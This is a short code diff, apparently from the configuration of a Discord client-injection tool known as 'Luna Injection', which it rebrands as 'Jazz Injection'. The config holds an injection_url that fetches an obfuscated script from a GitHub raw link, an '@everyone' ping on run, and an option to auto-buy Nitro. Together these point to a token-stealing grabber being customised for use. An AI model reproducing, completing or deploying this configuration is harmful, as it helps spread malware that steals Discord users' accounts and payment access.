@@ -11,7 +11,7 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Luna Injection', 
+  embed_name: 'Jazz Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1134248299780657245/1144310810848542771/jazzrox12.gif?size=4096'.replace(/ /g, '%20'),
   embed_color: 5639644, 
   injection_url: 'https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js', 
